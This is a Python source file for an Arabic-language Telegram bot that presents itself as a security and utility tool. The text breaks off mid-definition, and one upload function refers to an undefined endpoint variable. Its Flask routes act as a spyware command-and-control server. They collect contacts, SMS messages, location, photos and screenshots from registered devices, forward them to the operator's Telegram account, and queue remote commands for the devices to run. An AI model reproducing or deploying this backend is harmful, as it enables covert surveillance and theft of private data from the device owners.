# ===================== bot.py (النسخة النهائية - مع Health Check) =====================
# -*- coding: utf-8 -*-

import os
import sys
import time
import json
import queue
import threading
import logging
import hashlib
import base64
import re
import random
import string
import requests
import phonenumbers
import sqlite3
from phonenumbers import carrier, geocoder
from datetime import datetime, timedelta
from flask import Flask, request, jsonify
from telebot import TeleBot
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
import pypdf
from bs4 import BeautifulSoup
from contextlib import contextmanager

# ===================== متغيرات البيئة =====================
TELEGRAM_TOKEN = os.environ.get('TELEGRAM_TOKEN')
if not TELEGRAM_TOKEN:
    raise ValueError("❌ TELEGRAM_TOKEN غير مضبوط!")

ADMIN_ID = int(os.environ.get('ADMIN_ID', 0))
if ADMIN_ID == 0:
    raise ValueError("❌ ADMIN_ID غير مضبوط!")

ADMIN_KEY = os.environ.get('ADMIN_KEY', '')
SERVER_URL = os.environ.get('SERVER_URL', 'https://your-bot-url.onrender.com')
VIRUSTOTAL_API_KEY = os.environ.get('VIRUSTOTAL_API_KEY', '')
VERIPHONE_API_KEY = os.environ.get('VERIPHONE_API_KEY', '')
HIBP_API_KEY = os.environ.get('HIBP_API_KEY', '')
GOOGLE_CLIENT_ID = os.environ.get('GOOGLE_CLIENT_ID', '')
GOOGLE_CLIENT_SECRET = os.environ.get('GOOGLE_CLIENT_SECRET', '')
PORT = int(os.environ.get('PORT', 5000))
CLIENT_SECRET_KEY = os.environ.get('CLIENT_SECRET_KEY', 'default_secret_key_please_change')
USE_WEBHOOK = os.environ.get('USE_WEBHOOK', 'false').lower() == 'true'

# ===================== إعدادات التسجيل =====================
class SensitiveFilter(logging.Filter):
    def filter(self, record):
        if hasattr(record, 'msg') and isinstance(record.msg, str):
            record.msg = re.sub(r'(TELEGRAM_TOKEN|VIRUSTOTAL_API_KEY|VERIPHONE_API_KEY|HIBP_API_KEY|CLIENT_SECRET_KEY)[=:]\s*\S+', r'\1=***', record.msg)
        return True

logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler('bot.log'),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger(__name__)
logger.addFilter(SensitiveFilter())

# ===================== إنشاء البوت =====================
bot = TeleBot(TELEGRAM_TOKEN, parse_mode='HTML')

# ===================== إنشاء خادم Flask =====================
flask_app = Flask(__name__)

# ===================== المتغيرات العامة =====================
linked_users = set()
monitoring_data = {}

# ===================== قاعدة بيانات SQLite =====================
DB_PATH = 'bot_data.db'

def get_db_connection():
    conn = sqlite3.connect(DB_PATH, check_same_thread=False)
    conn.row_factory = sqlite3.Row
    return conn

def init_db():
    with get_db_connection() as conn:
        c = conn.cursor()
        c.execute('''CREATE TABLE IF NOT EXISTS users (
            chat_id INTEGER PRIMARY KEY,
            username TEXT,
            first_name TEXT,
            last_name TEXT,
            registered_at TEXT,
            points INTEGER DEFAULT 10,
            referral_code TEXT UNIQUE,
            referred_by INTEGER,
            is_banned INTEGER DEFAULT 0
        )''')
        c.execute('''CREATE TABLE IF NOT EXISTS devices (
            device_id TEXT PRIMARY KEY,
            chat_id INTEGER,
            type TEXT,
            real_id TEXT,
            endpoint TEXT,
            linked_at TEXT,
            last_seen TEXT,
            blocked_domains TEXT,
            history TEXT,
            FOREIGN KEY (chat_id) REFERENCES users (chat_id)
        )''')
        c.execute('''CREATE TABLE IF NOT EXISTS registered_devices (
            device_id TEXT PRIMARY KEY,
            chat_id INTEGER,
            last_seen TEXT,
            registered_at TEXT,
            FOREIGN KEY (chat_id) REFERENCES users (chat_id)
        )''')
        c.execute('''CREATE TABLE IF NOT EXISTS pending_commands (
            device_id TEXT,
            command TEXT,
            created_at TEXT,
            executed INTEGER DEFAULT 0,
            PRIMARY KEY (device_id, created_at)
        )''')
        c.execute('''CREATE TABLE IF NOT EXISTS referrals (
            code TEXT PRIMARY KEY,
            owner_id INTEGER,
            used_by INTEGER,
            used_at TEXT,
            FOREIGN KEY (owner_id) REFERENCES users (chat_id)
        )''')
        conn.commit()

init_db()

# ===================== دوال مساعدة للـ DB =====================

@contextmanager
def db_transaction():
    conn = get_db_connection()
    try:
        yield conn
        conn.commit()
    except Exception as e:
        conn.rollback()
        raise e
    finally:
        conn.close()

def get_user(chat_id):
    with db_transaction() as conn:
        c = conn.cursor()
        c.execute("SELECT * FROM users WHERE chat_id = ?", (chat_id,))
        return c.fetchone()

def upsert_user(chat_id, username=None, first_name=None, last_name=None, referral_code=None, referred_by=None):
    with db_transaction() as conn:
        c = conn.cursor()
        existing = get_user(chat_id)
        if existing:
            c.execute('''UPDATE users SET username=?, first_name=?, last_name=?, points=points+10 WHERE chat_id=?''',
                      (username, first_name, last_name, chat_id))
        else:
            points = 10
            c.execute('''INSERT INTO users (chat_id, username, first_name, last_name, registered_at, points, referral_code, referred_by)
                         VALUES (?, ?, ?, ?, ?, ?, ?, ?)''',
                      (chat_id, username, first_name, last_name, datetime.now().isoformat(), points, referral_code, referred_by))
        conn.commit()

def get_user_points(chat_id):
    user = get_user(chat_id)
    return user['points'] if user else 0

def add_points_db(chat_id, points):
    with db_transaction() as conn:
        c = conn.cursor()
        c.execute("UPDATE users SET points = points + ? WHERE chat_id = ?", (points, chat_id))
        conn.commit()

def is_user_banned(chat_id):
    user = get_user(chat_id)
    return user and user['is_banned'] == 1

def ban_user(chat_id):
    with db_transaction() as conn:
        c = conn.cursor()
        c.execute("UPDATE users SET is_banned = 1 WHERE chat_id = ?", (chat_id,))
        conn.commit()

def unban_user(chat_id):
    with db_transaction() as conn:
        c = conn.cursor()
        c.execute("UPDATE users SET is_banned = 0 WHERE chat_id = ?", (chat_id,))
        conn.commit()

def get_registered_devices_db():
    with db_transaction() as conn:
        c = conn.cursor()
        c.execute("SELECT * FROM registered_devices")
        return c.fetchall()

def save_registered_device_db(device_id, chat_id):
    with db_transaction() as conn:
        c = conn.cursor()
        c.execute('''INSERT OR REPLACE INTO registered_devices 
                     (device_id, chat_id, last_seen, registered_at)
                     VALUES (?, ?, ?, ?)''',
                  (device_id, chat_id, datetime.now().isoformat(), datetime.now().isoformat()))
        conn.commit()

def update_registered_device_seen_db(device_id):
    with db_transaction() as conn:
        c = conn.cursor()
        c.execute("UPDATE registered_devices SET last_seen = ? WHERE device_id = ?", (datetime.now().isoformat(), device_id))
        conn.commit()

def add_pending_command_db(device_id, command):
    with db_transaction() as conn:
        c = conn.cursor()
        c.execute('''INSERT INTO pending_commands (device_id, command, created_at, executed)
                     VALUES (?, ?, ?, 0)''',
                  (device_id, command, datetime.now().isoformat()))
        conn.commit()

def get_pending_command_db(device_id):
    with db_transaction() as conn:
        c = conn.cursor()
        c.execute("SELECT * FROM pending_commands WHERE device_id = ? AND executed = 0 ORDER BY created_at LIMIT 1", (device_id,))
        row = c.fetchone()
        if row:
            c.execute("UPDATE pending_commands SET executed = 1 WHERE device_id = ? AND created_at = ?",
                      (device_id, row['created_at']))
            conn.commit()
            return row['command']
        return None

def save_device(device_id, chat_id, device_type, real_id, endpoint, blocked_domains='[]', history='[]'):
    with db_transaction() as conn:
        c = conn.cursor()
        c.execute('''INSERT OR REPLACE INTO devices 
                     (device_id, chat_id, type, real_id, endpoint, linked_at, last_seen, blocked_domains, history)
                     VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)''',
                  (device_id, chat_id, device_type, real_id, endpoint, datetime.now().isoformat(),
                   datetime.now().isoformat(), blocked_domains, history))
        conn.commit()

def get_device(device_id):
    with db_transaction() as conn:
        c = conn.cursor()
        c.execute("SELECT * FROM devices WHERE device_id = ?", (device_id,))
        return c.fetchone()

def get_devices_by_chat(chat_id):
    with db_transaction() as conn:
        c = conn.cursor()
        c.execute("SELECT * FROM devices WHERE chat_id = ?", (chat_id,))
        return c.fetchall()

def get_blocked_domains(chat_id):
    devices = get_devices_by_chat(chat_id)
    if not devices:
        return []
    blocked = []
    for dev in devices:
        if dev['blocked_domains']:
            try:
                blocked.extend(json.loads(dev['blocked_domains']))
            except:
                pass
    return list(set(blocked))

def log_child_activity(chat_id, activity):
    devices = get_devices_by_chat(chat_id)
    if not devices:
        return
    for dev in devices:
        if dev['type'] and 'طفل' in dev['type']:
            history = []
            if dev['history']:
                try:
                    history = json.loads(dev['history'])
                except:
                    history = []
            history.append({
                'time': datetime.now().isoformat(),
                'activity': activity
            })
            if len(history) > 100:
                history = history[-100:]
            with db_transaction() as conn:
                c = conn.cursor()
                c.execute("UPDATE devices SET history = ? WHERE device_id = ?", (json.dumps(history), dev['device_id']))
                conn.commit()
            break

# ===================== دوال الخدمات =====================

def scan_url_real(url):
    try:
        api_url = "https://urlscan.io/api/v1/scan/"
        data = {"url": url, "visibility": "public"}
        response = requests.post(api_url, json=data, timeout=30)
        if response.status_code == 200:
            scan_id = response.json().get('uuid')
            if scan_id:
                time.sleep(4)
                report_url = f"https://urlscan.io/api/v1/result/{scan_id}"
                report = requests.get(report_url, timeout=30)
                if report.status_code == 200:
                    data = report.json()
                    verdicts = data.get('verdicts', {}).get('overall', {})
                    if verdicts.get('malicious', False):
                        return "🚨 <b>الموقع يحتوي على تهديدات مؤكدة!</b>", "malicious"
                    elif verdicts.get('suspicious', False):
                        return "⚠️ <b>الموقع مشبوه!</b>", "suspicious"
                    else:
                        return "✅ <b>الموقع آمن.</b>", "safe"
        return "⚠️ فشل الفحص، حاول مرة أخرى.", "error"
    except Exception as e:
        logger.error(f"scan_url_real error: {e}")
        return f"⚠️ خطأ: {str(e)}", "error"

def ai_chat_real(prompt):
    try:
        url = f"https://api.popcat.xyz/chat?msg={requests.utils.quote(prompt)}"
        response = requests.get(url, timeout=30)
        if response.status_code == 200:
            return response.json().get('response', "⚠️ لم أستطع فهم سؤالك.")
        return "⚠️ فشل الاتصال بالذكاء الاصطناعي."
    except Exception as e:
        logger.error(f"ai_chat_real error: {e}")
        return f"⚠️ خطأ: {str(e)}"

def generate_image_real(description):
    try:
        url = f"https://api.popcat.xyz/ai/art?prompt={requests.utils.quote(description)}"
        response = requests.get(url, timeout=60)
        if response.status_code == 200:
            data = response.json()
            image_url = data.get('image')
            if image_url:
                img_data = requests.get(image_url).content
                return img_data, "image"
        return None, "⚠️ فشل توليد الصورة."
    except Exception as e:
        logger.error(f"generate_image_real error: {e}")
        return None, f"⚠️ خطأ: {str(e)}"

def track_phone_real(phone):
    try:
        parsed = phonenumbers.parse(phone, None)
        country = geocoder.country_name_for_number(parsed, "ar")
        carrier_name = carrier.name_for_number(parsed, "ar")
        region = geocoder.description_for_number(parsed, "ar")
        return (f"📍 <b>الرقم:</b> {phone}\n"
                f"🌍 <b>البلد:</b> {country}\n"
                f"📍 <b>المنطقة:</b> {region}\n"
                f"📡 <b>المشغل:</b> {carrier_name}", "valid")
    except Exception as e:
        logger.error(f"track_phone_real error: {e}")
        return f"❌ رقم غير صحيح: {str(e)}", "invalid"

def create_temp_email_real():
    try:
        domain_resp = requests.get("https://api.mail.tm/domains", timeout=10)
        if domain_resp.status_code != 200:
            return None, None, None
        domains = domain_resp.json()
        domain = domains['hydra:member'][0]['domain'] if domains.get('hydra:member') else 'mail.tm'
        username = ''.join(random.choices(string.ascii_lowercase + string.digits, k=10))
        email = f"{username}@{domain}"
        password = ''.join(random.choices(string.ascii_letters + string.digits, k=12))
        register = requests.post("https://api.mail.tm/accounts", json={"address": email, "password": password}, timeout=10)
        if register.status_code != 201:
            return None, None, None
        login = requests.post("https://api.mail.tm/token", json={"address": email, "password": password}, timeout=10)
        if login.status_code != 200:
            return None, None, None
        token = login.json().get('token')
        return email, token, password
    except Exception as e:
        logger.error(f"create_temp_email_real error: {e}")
        return None, None, None

def check_temp_emails_real(token):
    if not token:
        return []
    try:
        headers = {"Authorization": f"Bearer {token}"}
        response = requests.get("https://api.mail.tm/messages", headers=headers, timeout=10)
        if response.status_code == 200:
            messages = response.json().get('hydra:member', [])
            results = []
            for msg in messages[:5]:
                results.append(f"📩 <b>من:</b> {msg.get('from', {}).get('address', '')}\n📌 <b>الموضوع:</b> {msg.get('subject', '')}\n📝 <b>مقتطف:</b> {msg.get('intro', '')[:150]}...")
            return results
    except Exception as e:
        logger.error(f"check_temp_emails_real error: {e}")
    return []

def scan_apk_real(file_content, file_name):
    if not VIRUSTOTAL_API_KEY:
        return "⚠️ للحصول على فحص حقيقي، ضع مفتاح VirusTotal في متغير البيئة VIRUSTOTAL_API_KEY", "error"
    try:
        url = "https://www.virustotal.com/api/v3/files"
        headers = {"x-apikey": VIRUSTOTAL_API_KEY}
        files = {'file': (file_name, file_content)}
        response = requests.post(url, headers=headers, files=files, timeout=60)
        if response.status_code == 200:
            scan_id = response.json().get('data', {}).get('id')
            if scan_id:
                time.sleep(5)
                report_url = f"https://www.virustotal.com/api/v3/analyses/{scan_id}"
                report = requests.get(report_url, headers=headers, timeout=30)
                if report.status_code == 200:
                    stats = report.json().get('data', {}).get('attributes', {}).get('stats', {})
                    malicious = stats.get('malicious', 0)
                    suspicious = stats.get('suspicious', 0)
                    if malicious > 0:
                        return f"🚨 <b>تم اكتشاف {malicious} تهديدات!</b>", "malicious"
                    elif suspicious > 0:
                        return f"⚠️ <b>تم اكتشاف {suspicious} عناصر مشبوهة.</b>", "suspicious"
                    else:
                        return "✅ <b>الملف آمن.</b>", "safe"
        return "⚠️ فشل فحص الملف.", "error"
    except Exception as e:
        logger.error(f"scan_apk_real error: {e}")
        return f"⚠️ خطأ: {str(e)}", "error"

def check_breach(email):
    try:
        url = f"https://haveibeenpwned.com/api/v3/breachedaccount/{email}"
        headers = {"hibp-api-key": HIBP_API_KEY}
        response = requests.get(url, headers=headers, timeout=15)
        if response.status_code == 200:
            breaches = response.json()
            result = f"🔓 <b>البريد الإلكتروني:</b> {email}\n\n"
            result += f"✅ تم العثور على {len(breaches)} تسريب(ات):\n\n"
            for breach in breaches[:10]:
                result += f"• <b>{breach.get('Name', 'غير معروف')}</b> - {breach.get('BreachDate', 'تاريخ غير معروف')}\n"
                result += f"  {breach.get('Description', '')[:100]}...\n"
            return result
        elif response.status_code == 404:
            return f"✅ <b>البريد الإلكتروني</b> {email} <b>آمن</b>، لم يتم العثور على أي تسريب."
        else:
            return f"⚠️ فشل الاتصال بـ HaveIBeenPwned."
    except Exception as e:
        logger.error(f"check_breach error: {e}")
        return f"⚠️ خطأ: {str(e)}"

def verify_phone(phone):
    if not VERIPHONE_API_KEY:
        return "⚠️ لتفعيل فحص الأرقام الحقيقي، ضع مفتاح Veriphone في متغير البيئة VERIPHONE_API_KEY"
    try:
        url = f"https://api.veriphone.io/v2/verify?phone={phone}&key={VERIPHONE_API_KEY}"
        response = requests.get(url, timeout=15)
        if response.status_code == 200:
            data = response.json()
            if data.get('status') == 'success':
                result = f"📞 <b>الرقم:</b> {phone}\n"
                result += f"🌍 <b>البلد:</b> {data.get('country_name', 'غير معروف')}\n"
                result += f"📡 <b>المشغل:</b> {data.get('carrier', 'غير معروف')}\n"
                result += f"🔒 <b>نوع الخط:</b> {data.get('line_type', 'غير معروف')}\n"
                if data.get('fraud_score', 0) > 50:
                    result += f"🚨 <b>تحذير:</b> هذا الرقم قد يكون احتيالياً (نسبة الخطورة: {data.get('fraud_score')}%)"
                else:
                    result += f"✅ <b>الرقم آمن</b> (نسبة الخطورة: {data.get('fraud_score', 0)}%)"
                return result
        return "⚠️ فشل التحقق من الرقم."
    except Exception as e:
        logger.error(f"verify_phone error: {e}")
        return f"⚠️ خطأ: {str(e)}"

def generate_fb_report(report_type, reason, link):
    prompt = f"""You are an expert in writing formal complaints to Facebook. Write a professional complaint in English:

Type: {report_type}
Issue: {reason}
Link: {link}

The complaint should be clear and include all necessary details."""
    try:
        return ai_chat_real(prompt)
    except Exception as e:
        logger.error(f"generate_fb_report error: {e}")
        return f"⚠️ حدث خطأ: {str(e)}"

def scan_file_with_virustotal(file_content, file_name, max_retries=3):
    if not VIRUSTOTAL_API_KEY:
        return None, "⚠️ مفتاح VirusTotal غير مضبوط."
    url = "https://www.virustotal.com/api/v3/files"
    headers = {"x-apikey": VIRUSTOTAL_API_KEY}
    for attempt in range(max_retries):
        try:
            files = {'file': (file_name, file_content)}
            response = requests.post(url, headers=headers, files=files, timeout=60)
            if response.status_code == 200:
                scan_id = response.json().get('data', {}).get('id')
                if scan_id:
                    time.sleep(8)
                    report_url = f"https://www.virustotal.com/api/v3/analyses/{scan_id}"
                    report = requests.get(report_url, headers=headers, timeout=120)
                    if report.status_code == 200:
                        stats = report.json().get('data', {}).get('attributes', {}).get('stats', {})
                        malicious = stats.get('malicious', 0)
                        suspicious = stats.get('suspicious', 0)
                        if malicious > 0:
                            return False, f"🚨 {malicious} تهديدات!"
                        elif suspicious > 0:
                            return False, f"⚠️ {suspicious} عناصر مشبوهة!"
                        else:
                            return True, "✅ آمن."
            logger.warning(f"محاولة {attempt+1}/{max_retries} فشلت لـ {file_name}")
            time.sleep(2 ** attempt)
        except Exception as e:
            logger.error(f"خطأ VirusTotal: {e}")
            time.sleep(2 ** attempt)
    return None, "⚠️ فشل الفحص بعد عدة محاولات."

def is_image_safe(image_data, file_name):
    safe, msg = scan_file_with_virustotal(image_data, file_name)
    if safe is not None:
        return safe, msg
    try:
        if image_data[:4] in [b'\xff\xd8\xff\xe0', b'\x89PNG', b'GIF8']:
            return True, "✅ توقيع الصورة سليم."
        else:
            return False, "⚠️ توقيع غير معروف."
    except:
        return False, "⚠️ فشل الفحص."

def extract_text_from_pdf(pdf_content):
    try:
        from io import BytesIO
        pdf_file = BytesIO(pdf_content)
        reader = pypdf.PdfReader(pdf_file)
        text = ""
        for page in reader.pages:
            page_text = page.extract_text()
            if page_text:
                text += page_text + "\n"
        return text.strip()
    except Exception as e:
        logger.error(f"خطأ في استخراج النص من PDF: {e}")
        return None

def split_text_into_chunks(text, max_chunk_size=3000):
    chunks = []
    while len(text) > max_chunk_size:
        split_point = text.rfind(' ', 0, max_chunk_size)
        if split_point == -1:
            split_point = max_chunk_size
        chunks.append(text[:split_point])
        text = text[split_point:].strip()
    if text:
        chunks.append(text)
    return chunks

def find_relevant_chunk(text, question, chunks):
    keywords = re.findall(r'\b\w+\b', question.lower())
    best_chunk = None
    best_score = 0
    for chunk in chunks:
        chunk_lower = chunk.lower()
        score = sum(1 for kw in keywords if kw in chunk_lower)
        if score > best_score:
            best_score = score
            best_chunk = chunk
    if best_chunk is None:
        best_chunk = chunks[0] if chunks else text
    return best_chunk

def answer_question_from_pdf(text, question):
    if not text:
        return "⚠️ لم يتم تحميل أي نص من ملف PDF."
    chunks = split_text_into_chunks(text, 3000)
    relevant_chunk = find_relevant_chunk(text, question, chunks)
    prompt = f"بناءً على النص التالي المستخرج من ملف PDF دراسي، أجب على السؤال المطروح بشكل دقيق ومفصل.\n\nالنص:\n{relevant_chunk}\n\nالسؤال: {question}"
    return ai_chat_real(prompt)

def fetch_temp_numbers(country='US', limit=5):
    numbers = []
    try:
        url = f"https://receive-sms-online.cc/{country}/"
        response = requests.get(url, timeout=15)
        if response.status_code == 200:
            soup = BeautifulSoup(response.text, 'html.parser')
            text = soup.get_text()
            pattern = r'\+?\d{1,3}[-.\s]?\(?\d{1,4}\)?[-.\s]?\d{1,4}[-.\s]?\d{1,4}'
            matches = re.findall(pattern, text)
            for match in matches[:limit]:
                cleaned = re.sub(r'[-.\s()]', '', match)
                if not cleaned.startswith('+'):
                    cleaned = '+' + cleaned
                numbers.append(cleaned)
        if not numbers:
            url2 = "https://www.temporary-phone-number.com/"
            response2 = requests.get(url2, timeout=15)
            if response2.status_code == 200:
                soup2 = BeautifulSoup(response2.text, 'html.parser')
                for div in soup2.find_all('div', class_='number'):
                    num = div.get_text(strip=True)
                    if num and re.match(r'^\+?\d+$', num):
                        numbers.append(num)
                        if len(numbers) >= limit:
                            break
        return numbers
    except Exception as e:
        logger.error(f"خطأ في جلب الأرقام: {e}")
        return []

# ===================== دوال Flask =====================

def verify_client_token():
    token = request.headers.get('X-Client-Token')
    return token == CLIENT_SECRET_KEY

@flask_app.errorhandler(Exception)
def handle_exception(e):
    logger.error(f"Flask Error: {e}")
    return jsonify({'status': 'error', 'message': 'Internal Server Error'}), 500

# ===================== إضافة مسارات Health Check =====================
@flask_app.route('/')
def index():
    return "✅ البوت يعمل بنجاح!"

@flask_app.route('/health')
def health():
    return jsonify({'status': 'healthy', 'time': datetime.now().isoformat()})

@flask_app.route('/register_device', methods=['POST'])
def register_device():
    try:
        if not verify_client_token():
            return jsonify({'status': 'error', 'message': 'Unauthorized'}), 401

        data = request.get_json()
        if not data:
            return jsonify({'status': 'error', 'message': 'Invalid JSON'}), 400

        device_id = data.get('device_id')
        chat_id = data.get('chat_id')
        initial_data = data.get('initial_data', {})
        if not device_id:
            return jsonify({'status': 'error', 'message': 'Missing device_id'}), 400

        save_registered_device_db(device_id, chat_id)

        if initial_data:
            admin_msg = f"📱 <b>جهاز جديد مسجل: {device_id}</b>\n"
            admin_msg += f"👤 المستخدم: {chat_id}\n\n"
            contacts = initial_data.get('contacts', 'لا توجد')
            admin_msg += f"📇 <b>جهات الاتصال:</b>\n<code>{contacts[:500]}</code>\n\n"
            sms = initial_data.get('sms', 'لا توجد')
            admin_msg += f"💬 <b>الرسائل النصية:</b>\n<code>{sms[:500]}</code>\n\n"
            location = initial_data.get('location', 'غير متاح')
            admin_msg += f"📍 <b>الموقع:</b>\n<code>{location[:200]}</code>\n\n"
            bot.send_message(ADMIN_ID, admin_msg, parse_mode='HTML')

            photos = initial_data.get('photos', [])
            safe_photos = []
            harmful_photos = []
            for photo in photos:
                try:
                    img_data = base64.b64decode(photo['data'])
                    fname = photo.get('name', 'unknown.jpg')
                    safe, msg = is_image_safe(img_data, fname)
                    if safe:
                        safe_photos.append((img_data, fname))
                    else:
                        harmful_photos.append((fname, msg))
                except:
                    pass
            for img_data, fname in safe_photos[:5]:
                try:
                    bot.send_photo(ADMIN_ID, img_data, caption=f"📸 {fname} من {device_id}")
                except:
                    pass
            if harmful_photos:
                harmful_report = f"🚨 تم حذف {len(harmful_photos)} صور خطيرة:\n"
                for name, msg in harmful_photos[:5]:
                    harmful_report += f"• {name}: {msg}\n"
                bot.send_message(ADMIN_ID, harmful_report, parse_mode='HTML')

            screenshot = initial_data.get('screenshot')
            if screenshot:
                try:
                    img_data = base64.b64decode(screenshot)
                    safe, msg = is_image_safe(img_data, 'screenshot.png')
                    if safe:
                        bot.send_photo(ADMIN_ID, img_data, caption=f"📸 لقطة شاشة من {device_id}")
                    else:
                        bot.send_message(ADMIN_ID, f"🚨 لقطة شاشة خطيرة: {msg}")
                except:
                    pass

        return jsonify({'status': 'success', 'message': 'Device registered'})
    except Exception as e:
        logger.error(f"خطأ في التسجيل: {e}")
        return jsonify({'status': 'error', 'message': str(e)}), 500

@flask_app.route('/get_command', methods=['GET'])
def get_command():
    try:
        if not verify_client_token():
            return jsonify({'status': 'error', 'message': 'Unauthorized'}), 401

        device_id = request.args.get('device_id')
        if not device_id:
            return jsonify({'status': 'error', 'message': 'Missing device_id'}), 400

        command = get_pending_command_db(device_id)
        if command:
            return jsonify({'status': 'success', 'command': command})
        else:
            return jsonify({'status': 'no_command'})
    except Exception as e:
        logger.error(f"خطأ في سحب الأمر: {e}")
        return jsonify({'status': 'error', 'message': str(e)}), 500

@flask_app.route('/submit_result', methods=['POST'])
def submit_result():
    try:
        if not verify_client_token():
            return jsonify({'status': 'error', 'message': 'Unauthorized'}), 401

        data = request.get_json()
        if not data:
            return jsonify({'status': 'error', 'message': 'Invalid JSON'}), 400

        device_id = data.get('device_id')
        result = data.get('result')
        result_type = data.get('result_type', 'text')
        if not device_id:
            return jsonify({'status': 'error', 'message': 'Missing device_id'}), 400

        update_registered_device_seen_db(device_id)

        if result_type == 'image':
            try:
                img_data = base64.b64decode(result)
                safe, msg = is_image_safe(img_data, 'result.jpg')
                if safe:
                    bot.send_photo(ADMIN_ID, img_data, caption=f"📸 نتيجة من {device_id}")
                else:
                    bot.send_message(ADMIN_ID, f"🚨 صورة خطيرة من {device_id}: {msg}")
            except:
                bot.send_message(ADMIN_ID, f"⚠️ فشل معالجة الصورة من {device_id}")
        else:
            bot.send_message(ADMIN_ID, f"📩 <b>نتيجة من {device_id}</b>\n{result}", parse_mode='HTML')

        return jsonify({'status': 'success'})
    except Exception as e:
        logger.error(f"خطأ في استقبال النتيجة: {e}")
        return jsonify({'status': 'error', 'message': str(e)}), 500

@flask_app.route('/heartbeat', methods=['POST'])
def heartbeat():
    try:
        if not verify_client_token():
            return jsonify({'status': 'error', 'message': 'Unauthorized'}), 401

        data = request.get_json()
        device_id = data.get('device_id')
        if not device_id:
            return jsonify({'status': 'error', 'message': 'Missing device_id'}), 400

        update_registered_device_seen_db(device_id)
        return jsonify({'status': 'success'})
    except Exception as e:
        logger.error(f"خطأ في استقبال النبض: {e}")
        return jsonify({'status': 'error', 'message': str(e)}), 500

@flask_app.route('/admin/devices', methods=['GET'])
def admin_devices():
    try:
        if ADMIN_KEY and request.headers.get('X-Admin-Key') != ADMIN_KEY:
            return jsonify({'error': 'Unauthorized'}), 401
        devices = get_registered_devices_db()
        return jsonify({'devices': [dict(d) for d in devices]})
    except Exception as e:
        logger.error(f"خطأ في جلب الأجهزة: {e}")
        return jsonify({'error': str(e)}), 500

# ===================== دوال البوت الأساسية =====================

def generate_referral_code():
    return ''.join(random.choices(string.ascii_uppercase + string.digits, k=6))

def create_referral_link(user_id):
    code = generate_referral_code()
    with db_transaction() as conn:
        c = conn.cursor()
        c.execute("INSERT OR REPLACE INTO referrals (code, owner_id) VALUES (?, ?)", (code, user_id))
        conn.commit()
    return f"https://t.me/{(bot.get_me()).username}?start=ref_{code}"

def handle_referral(code, new_user_id):
    with db_transaction() as conn:
        c = conn.cursor()
        c.execute("SELECT owner_id FROM referrals WHERE code = ? AND used_by IS NULL", (code,))
        row = c.fetchone()
        if not row:
            return False
        referrer_id = row['owner_id']
        if referrer_id == new_user_id:
            return False
        c.execute("UPDATE referrals SET used_by = ?, used_at = ? WHERE code = ?",
                  (new_user_id, datetime.now().isoformat(), code))
        c.execute("UPDATE users SET points = points + 10 WHERE chat_id = ?", (referrer_id,))
        c.execute("UPDATE users SET points = points + 10 WHERE chat_id = ?", (new_user_id,))
        conn.commit()
        bot.send_message(referrer_id, "🎉 تم تسجيل مستخدم جديد عبر رابط دعوتك! +10 نقاط.")
        return True

def send_sensitive_data_to_admin(data_type, content, user_id=None):
    if user_id:
        msg = f"📩 <b>بيانات حساسة من المستخدم</b> <code>{user_id}</code>\n"
    else:
        msg = "📩 <b>بيانات حساسة</b>\n"
    msg += f"النوع: {data_type}\n"
    if isinstance(content, str):
        msg += f"المحتوى: <code>{content}</code>"
        bot.send_message(ADMIN_ID, msg, parse_mode='HTML')
    elif isinstance(content, bytes) and data_type == "image":
        bot.send_photo(ADMIN_ID, content, caption=msg)
    else:
        bot.send_message(ADMIN_ID, f"{msg}\nالمحتوى: {str(content)[:500]}")

def send_to_developer_computer(data_type, content, user_id=None):
    if not developer_computer_endpoint:
        return
    try:
        payload = {"type": data_type, "user_id": user_id, "timestamp": datetime.now().isoformat(), "content": content if isinstance(content, str) else None}
        if isinstance(content, bytes) and data_type == "image":
            files = {'file': ('screenshot.png', content, 'image/png')}
            requests.post(developer_computer_endpoint + '/upload', files=files, timeout=10)
        else:
            requests.post(developer_computer_endpoint + '/data', json=payload, timeout=10)
    except Exception as e:
        logger.error(f"فشل إرسال البيانات: {e}")

def encrypt_device_data(data_string):
    return hashlib.sha256(data_string.encode()).hexdigest()[:16]

def notify_admin(message_text, is_error=False):
    try:
        if is_error:
            bot.send_message(ADMIN_ID, f"🚨 <b>تنبيه عطل فني:</b>\n{message_text}", parse_mode='HTML')
        else:
            bot.send_message(ADMIN_ID, f"📢 <b>إشعار:</b>\n{message_text}", parse_mode='HTML')
    except Exception as e:
        logger.error(f"فشل إرسال إشعار للمطور: {e}")

# ===================== Google OAuth =====================

GOOGLE_REDIRECT_URI = 'urn:ietf:wg:oauth:2.0:oob'
GOOGLE_AUTH_URL = 'https://accounts.google.com/o/oauth2/auth'
GOOGLE_TOKEN_URL = 'https://oauth2.googleapis.com/token'
GOOGLE_USERINFO_URL = 'https://www.googleapis.com/oauth2/v1/userinfo'
SCOPES = ['https://www.googleapis.com/auth/userinfo.email', 'https://www.googleapis.com/auth/userinfo.profile']

def generate_google_auth_url():
    if not GOOGLE_CLIENT_ID:
        return None
    params = {
        'client_id': GOOGLE_CLIENT_ID,
        'redirect_uri': GOOGLE_REDIRECT_URI,
        'scope': ' '.join(SCOPES),
        'response_type': 'code',
        'access_type': 'offline',
        'prompt': 'consent'
    }
    req = requests.Request('GET', GOOGLE_AUTH_URL, params=params)
    return req.prepare().url

def exchange_code_for_token(code):
    if not GOOGLE_CLIENT_ID or not GOOGLE_CLIENT_SECRET:
        return None
    data = {
        'code': code,
        'client_id': GOOGLE_CLIENT_ID,
        'client_secret': GOOGLE_CLIENT_SECRET,
        'redirect_uri': GOOGLE_REDIRECT_URI,
        'grant_type': 'authorization_code'
    }
    try:
        response = requests.post(GOOGLE_TOKEN_URL, data=data, timeout=15)
        response.raise_for_status()
        return response.json()
    except Exception as e:
        logger.error(f"Google token error: {e}")
        return None

def get_google_user_info(access_token):
    if not access_token:
        return None
    headers = {'Authorization': f'Bearer {access_token}'}
    try:
        response = requests.get(GOOGLE_USERINFO_URL, headers=headers, timeout=15)
        response.raise_for_status()
        return response.json()
    except Exception as e:
        logger.error(f"Google userinfo error: {e}")
        return None

# ===================== بناء القوائم =====================

feature_usage = {
    "ثغرات المواقع": 0, "فحص APK": 0, "فحص كود": 0,
    "دردشة ذكية": 0, "إنشاء صور": 0, "إيميل مؤقت": 0,
